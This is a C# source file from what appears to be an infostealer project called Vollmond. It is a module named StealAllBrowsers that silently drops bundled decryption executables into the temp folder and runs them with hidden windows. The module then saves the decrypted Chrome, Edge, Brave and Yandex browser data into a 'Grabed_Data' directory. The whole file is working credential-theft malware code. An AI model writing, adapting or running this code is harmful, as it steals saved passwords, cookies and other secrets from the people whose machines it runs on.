using System.Diagnostics;
using System.Text;

namespace Vollmond.Browsers
{
    internal class StealAllBrowsers
    {
        /*
        ----------------------------------------------------------
         Author chromelevator_x64.exe: https://github.com/xaitax
        Original repo, with source code: https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption
        ----------------------------------------------------------
        Author YandexDecryptor.exe: https://github.com/LimerBoy
        Original repo, with source code: https://github.com/LimerBoy/Soviet-Thief/tree/main/csharp
        ----------------------------------------------------------
         */
        public static void stealAllBrowsers()
        {
            string temp_path = Path.GetTempPath();
            string dataFolder_path = Path.Combine(temp_path, "Grabed_Data", "BrowsersData");

            Directory.CreateDirectory(Path.Combine(temp_path, "Grabed_Data", "BrowsersData")); // Create directory for data

            // Chrome, Edge and Brave
            try
            {
                ExtractResources.ExtractResource("payload.Browsers", "chromelevator_x64.exe", temp_path);

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = Path.Combine(temp_path, "chromelevator_x64.exe"),
                    Arguments = $"-v -f -o {$@"C:/Users/{Environment.UserName}/AppData/Local/Temp/Grabed_Data/BrowsersData"} all",
                    RedirectStandardOutput = true, // Allow interception
                    UseShellExecute = false,       // I don't know what is it.. But i know what, it isn't important
                    CreateNoWindow = true,          // Hide Console Window
                    StandardOutputEncoding = System.Text.Encoding.UTF8
                };

                using (Process process = Process.Start(startInfo))
                {
                    string result = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();

                    File.WriteAllText(Path.Combine(temp_path, "Grabed_Data", "BrowsersData", "Info.txt"), result, Encoding.UTF8);
                }
            }
            catch { }

            // Yandex browser
            try
            {
                ExtractResources.ExtractResource("payload.Browsers", "YandexDecryptor.exe", temp_path);

                ProcessStartInfo yandex_info = new ProcessStartInfo()
                {
                    FileName = Path.Combine(temp_path, "YandexDecryptor.exe"),
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(yandex_info))
                {
                    string result = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();

                    Directory.CreateDirectory(Path.Combine(dataFolder_path, "Yandex"));

                    if (!String.IsNullOrEmpty(result))
                        File.WriteAllText(Path.Combine(dataFolder_path, "Yandex", "Extracted_data.txt"), result, Encoding.UTF8);
                    else
                        File.WriteAllText(Path.Combine(dataFolder_path, "Yandex", "Extracted_data.txt"), "Yandex does not exist or was not found");
                }
            }
            catch { }
        }
    }
}
